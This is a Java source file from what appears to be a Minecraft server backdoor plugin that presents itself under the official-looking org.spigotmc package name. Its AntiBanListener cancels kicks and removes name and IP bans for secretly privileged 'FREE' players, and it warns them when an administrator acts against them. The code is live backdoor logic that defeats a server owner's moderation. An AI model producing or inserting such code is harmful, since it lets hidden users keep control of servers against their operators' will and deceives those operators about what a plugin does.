package org.spigotmc.events;

import org.spigotmc.manager.PlayerManager;
import org.spigotmc.commands.impl.player.AntiBan;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.methods.API;
import org.spigotmc.utils.Settings;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;

public class AntiBanListener implements Listener {
    
    @EventHandler
    public void onKick(PlayerKickEvent e) {
        Player p = e.getPlayer();
        if (AntiBan.isAntiBanEnabled) { 
            if (PlayerManager.isPlayerInType(PlayerType.FREE, p.getName())) {
                e.setCancelled(true);
                if (e.getPlayer().isBanned()) {
                    Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(e.getPlayer().getName());
                    Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIPOfPlayer(p));
                }
                p.sendMessage(Settings.PREFIX("Someone tried to kick/ban you"));
            }
        }
    }
}